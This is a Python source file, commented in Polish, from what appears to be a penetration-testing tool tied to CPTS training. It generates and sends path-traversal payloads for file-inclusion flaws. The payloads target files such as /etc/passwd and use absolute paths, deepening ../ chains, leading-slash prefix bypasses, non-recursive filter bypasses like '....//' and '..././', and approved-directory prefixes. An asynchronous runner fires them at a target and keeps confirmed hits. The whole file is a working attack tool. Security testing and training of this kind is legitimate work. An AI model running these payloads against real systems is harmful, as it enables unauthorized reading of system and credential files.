r"""Path traversal — pełny wachlarz bypassów z CPTS.

Pokrywa techniki z modułu File Inclusion:
  * absolutna ścieżka (/etc/passwd),
  * relatywna (../../../etc/passwd) o rosnącej głębokości,
  * prefix bypass (/../../../etc/passwd) — gdy input doklejany po prefiksie,
  * non-recursive filter bypass: ....// , ..././ , ....\/ , ....//// ,
  * approved-path prefix (./languages/../../../etc/passwd),
  * enkoding url / double-url dokładany przez klienta wg configu.
"""
from __future__ import annotations

from collections.abc import Iterator

from ..detection import Finding, should_show
from ..http_client import HttpClient
from .base import BaseModule

# Sekwencje traversalu (prefix budujący jeden poziom "w górę").
# Uwaga: "....\\/" w kodzie to literalne  ....\/  (jeden backslash).
_SEQUENCES = ["../", "....//", "..././", "....\\/", "....////"]

# Prefiksy approved-path, które czasem trzeba przepuścić przed traversalem.
_APPROVED_PREFIXES = ["", "languages/", "./languages/", "lang/"]


class TraversalModule(BaseModule):
    name = "traversal"
    description = "Path traversal + bypassy filtrów/prefiksów/enkodingu"

    def _norm(self, target: str) -> str:
        """Ścieżka względna bez wiodącego / (do doklejania traversalu)."""
        return target.lstrip("/").replace("C:/", "").replace("c:/", "")

    def payloads(self) -> Iterator[str]:
        """Pełny wachlarz (target x prefix x sekwencja x głębokość), bez
        auto-stopu — używany przez --all-hits. Normalnie `run()` jest
        nadpisany i przerywa głębokość przy pierwszym trafieniu, patrz niżej.
        """
        for target in self.targets():
            rel = self._norm(target)

            # 1) absolutna ścieżka — gdy input trafia wprost do include()
            yield target
            # 2) prefix bypass — wiodący / neutralizuje doklejony prefiks
            yield "/" + rel

            # 3) relatywny traversal: każda sekwencja x głębokość x approved-prefix
            for prefix in _APPROVED_PREFIXES:
                for seq in _SEQUENCES:
                    for depth in range(1, self.cfg.max_depth + 1):
                        yield prefix + seq * depth + rel

    async def _send_eval(self, client: HttpClient, payload: str) -> Finding:
        resp = await client.send(payload)
        if self.cfg.verbose and should_show(resp, self.cfg.mf):
            print(f"    [{resp.status}] {resp.length:>7}B  {payload[:80]}")
        return self.evaluate(resp)

    async def run(self, client: HttpClient) -> list[Finding]:
        """Auto-detekcja głębokości (P5): dla każdej kombinacji (target,
        prefix, sekwencja) próbuje głębokości rosnąco 1..max_depth i
        przerywa przy pierwszym potwierdzeniu — głębsze próby i tak by
        trafiły (nadmiarowe ../ ponad root są zwykle bezpiecznie obcinane),
        więc są zbędnym ruchem/szumem na celu. Wyłączane przez --all-hits
        (wtedy testowane są wszystkie głębokości, jak w payloads()).
        """
        if self.cfg.all_hits:
            findings = [f async for f in self._run_all(client)]
            return self.dedup(findings)

        findings: list[Finding] = []
        for target in self.targets():
            rel = self._norm(target)

            for payload in (target, "/" + rel):
                finding = await self._send_eval(client, payload)
                if finding.confirmed:
                    findings.append(finding)

            for prefix in _APPROVED_PREFIXES:
                for seq in _SEQUENCES:
                    for depth in range(1, self.cfg.max_depth + 1):
                        finding = await self._send_eval(client, prefix + seq * depth + rel)
                        if finding.confirmed:
                            findings.append(finding)
                            break  # głębsze próby dla tej (prefix, seq) są zbędne
        return self.dedup(findings)

    async def _run_all(self, client: HttpClient):
        for payload in self.payloads():
            finding = await self._send_eval(client, payload)
            if finding.confirmed:
                yield finding
